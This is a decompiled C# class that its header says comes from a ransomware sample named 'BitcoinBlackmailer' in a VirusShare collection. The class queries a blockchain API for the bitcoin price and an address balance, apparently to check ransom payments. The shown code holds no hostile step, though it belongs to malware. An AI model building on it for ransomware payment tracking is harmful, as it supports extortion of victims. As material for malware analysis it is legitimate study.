// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1C352919-BC83-4243-9569-62DB63EC5DCB
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-a375201f22b6e71d8ea0f81266242e4638e1754aeee14059e9c5e39026d6c710.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress => "http://btc.blockr.io/api/v1/";

    internal static double GetPrice()
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "coin/info/"));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"][(object) "markets"][(object) "coinbase"].Value<double>((object) "value");
    }

    internal static double GetBalanceBtc(string address)
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "address/balance/" + address));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"].Value<double>((object) "balance");
    }
  }
}
